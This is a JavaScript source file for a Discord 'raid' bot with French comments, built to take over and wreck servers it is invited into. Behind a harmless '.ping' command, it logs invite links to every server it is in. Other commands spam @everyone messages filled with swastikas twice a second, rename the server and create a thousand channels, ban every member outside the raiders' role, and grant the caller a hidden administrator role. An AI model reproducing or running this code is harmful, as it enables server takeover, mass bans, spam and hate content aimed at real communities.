const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
 
var fucked = false;
 
bot.on('ready',() => {
  //invit link
  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`));
  });
});


bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }
  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.zoldyckfamily') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("RAID BY LA BRIGADE FANTÔME ET HUMOUR NOIR \n"+
     "@everyone 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 卐 https://cdn.discordapp.com/attachments/360168888954126336/361583742432706561/Raid_par_la_brigade.jpg \n"+
      "https://cdn.discordapp.com/attachments/427463509534834691/442274548797407233/unknown.png").catch(e => {});
    }, 500)
  }
 
  if (msg.content === '.mastermind') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;
 
    if (!fucked){
      msg.guild.setIcon("./humournoir.png").catch(e => {});
      msg.guild.setName('RAID BY HUMOUR NOIR ET LA BRIGADE FANTOME').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('raid_by_humour_noir_et_la_brigade_fantome', 'voice').catch(e => {});
        msg.guild.createChannel('raid_by_humour_noir_et_la_brigade_fantome', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.fdp') {
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Humour Noir Brigade Fantome") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.ragequit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.genjutsu') {
    console.log(`Commande .pardon par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "Humour Noir Brigade Fantome",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});

bot.login(process.env.BOT_TOKEN);
